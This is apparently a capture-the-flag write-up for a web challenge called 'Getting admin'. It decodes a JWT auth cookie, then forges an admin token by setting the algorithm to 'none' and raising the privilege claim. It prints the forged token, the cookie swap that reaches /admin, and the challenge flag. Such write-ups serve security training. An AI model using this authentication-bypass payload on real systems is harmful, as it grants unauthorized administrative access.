#Getting admin

##300 points - First solved by clubby789

Challenge instance ready at `88.198.219.20:30807`.

See if you can get an admin account.

##Steps
Since we are logged in from the previous challange lets look at our auth cookie since the login is preserved.

`auth:"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjogIkhhcnJ5IiwgInByaXZpbGVnZSI6IDF9.A7OHDo-b3PB5XONTRuTYq6jm2Ab8iaT353oc-VPPNMU"`

This is a `JWT` (*JSON Web Token*)
Lets look at it with [CyberChef](https://gchq.github.io/CyberChef/)

```
{
    "user": "Harry",
    "privilege": 1
}
```

Since we now get the structur of the token lets manipulate it and convert it to a `JWT`:
Remove the Key in *CC* and set the signing algorithm to `none`
Then generate the new `JWT` and add the last part from the first `JWT`

```
{"user": "admin", "privilege": 2}
```
**JWT**
```
eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiYWRtaW4iLCJwcml2aWxlZ2UiOjIsImlhdCI6MTU5MTc3NjA4Nn0.A7OHDo-b3PB5XONTRuTYq6jm2Ab8iaT353oc-VPPNMU
```

Now lets change the `auth-cookie` to the new `JWT` and access the `/admin` section.

##Flag
ractf{j4va5cr1pt_w3b_t0ken}